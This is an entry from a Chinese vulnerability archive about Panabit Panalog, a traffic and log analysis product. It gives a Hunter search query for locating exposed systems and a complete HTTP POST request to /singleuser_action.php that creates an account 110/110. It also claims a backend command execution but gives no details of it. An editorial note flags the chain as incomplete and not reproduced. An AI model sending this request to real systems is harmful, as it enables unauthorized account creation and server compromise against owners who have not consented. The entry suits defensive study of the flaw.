---
source: "wy876 漏洞文库"
id: "vw-6256eceb03f66fc186abe7d1"
entity_id: "ve-6256eceb03f66fc186abe7d1"
schema_version: "1"
fofa_unverified: "app.name="
title: "panabit日志审计系统任意用户创建漏洞和后台命令执行"
product: "Panabit Panalog"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "创建请求带PHPSESSID而未交代是否需登录；无版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Panabit/panabit%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lr43i377pvqttwpn"
source_status: "recorded"
---

# panabit日志审计系统任意用户创建漏洞和后台命令执行

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Panabit Panalog
- 本文讨论：singleuser_action.php任意用户创建；声称另有后台命令执行
- 版本、权限与配置前提：创建请求带PHPSESSID而未交代是否需登录；无版本
- 资料类型：账户创建链残缺PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 结尾只有“执行命令”无后台入口/命令/响应，链缺半段
- 新账号权限及是否可后台登录无证据；Content-Type表单却正文JSON需解释解析方式
- fofa误录Hunter残缺字段
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 认证边界、账户角色、后台命令入口及版本待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
panalog为北京派网软件有限公司，一款流量分析，日志分析管理的一款软件。存在任意用户创建漏洞和后台命令执行漏洞，可先通过任意用户创建，然后进行后台命令执行，获取服务器权限。

# 二、影响版本
+ Panabit panalog

# 三、资产测绘
+ hunter`app.name="Panabit 日志系统"`
+ 特征


# 四、漏洞复现
访问连接出现如下页面表示可能存在漏洞

```plain
/singleuser_action.php
```


通过POC添加用户

```http
POST /singleuser_action.php HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=4dkc7q5hu7lkdlsfm5a0tcirn6
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 578


{ "syncInfo": { "user": { "userId": "110", "userName": "110", "employeeId": "110", "departmentId": "110", "departmentName": "110", "coporationId": "110", "corporationName": "110", "userSex": "1",  "userDuty": "110", "userBirthday": "110", "userPost": "110", "userPostCode": "110", "userAlias": "110", "userRank": "110", "userPhone": "110", "userHomeAddress": "110", "userMobilePhone": "110", "userMailAddress": "110", "userMSN": "110", "userNt": "110", "userCA": "110", "userPwd": "110", "userClass": "110", "parentId": "110", "bxlx": "110" },"operationType": "ADD_USER" } }
```


使用添加的账户`110/110`


执行命令


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lr43i377pvqttwpn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
